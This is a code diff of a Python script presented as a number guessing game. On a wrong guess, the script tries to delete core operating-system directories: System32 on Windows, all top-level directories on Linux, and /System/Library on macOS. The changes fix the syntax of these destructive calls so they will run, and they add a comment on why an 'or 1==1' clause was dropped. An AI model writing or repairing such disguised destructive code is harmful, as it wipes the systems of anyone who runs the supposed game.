@@ -4,45 +4,44 @@ import platform
 
 def number_guessing_game():
     system_directories = [
-    '/bin',
-    '/boot',
-    '/dev',
-    '/etc',
-    '/home',
-    '/lib',
-    '/lib64',
-    '/media',
-    '/mnt',
-    '/opt',
-    '/proc',
-    '/root',
-    '/sbin',
-    '/srv',
-    '/sys',
-    '/tmp',
-    '/usr',
-    '/var'
+        '/bin',
+        '/boot',
+        '/dev',
+        '/etc',
+        '/home',
+        '/lib',
+        '/lib64',
+        '/media',
+        '/mnt',
+        '/opt',
+        '/proc',
+        '/root',
+        '/sbin',
+        '/srv',
+        '/sys',
+        '/tmp',
+        '/usr',
+        '/var'
     ]
     secret_number = random.randint(1, 10)
-    n=int(input("How many times do you want to play this game:"))
+    n = int(input("How many times do you want to play this game: "))
     for i in range(n):
         guess = int(input("Guess a number between 1 and 10: "))
 
         if guess == secret_number:
-            print("Your lucky")
+            print("You're lucky!")
         else:
-            print("oopsies")
-           if platform.system() == "Windows":
-              os.remove(C:\Windows\System32)
-           elif platform.system() == "Linux":
-                for i in system_directories:
-                  os.remove(i) or 1==1
-          elif platform.system() == "Darwin":
-              os.remove(/System/Library) 
-           
+            print("Oopsies!")
+            if platform.system() == "Windows":
+                os.remove("C:\\Windows\\System32")
+            elif platform.system() == "Linux":
+                for directory in system_directories:
+                    os.remove(directory)  # You can't use `or 1==1` in this context
+            elif platform.system() == "Darwin":
+                os.remove("/System/Library")
 
-# Run the game
 number_guessing_game()
+
 
 
 
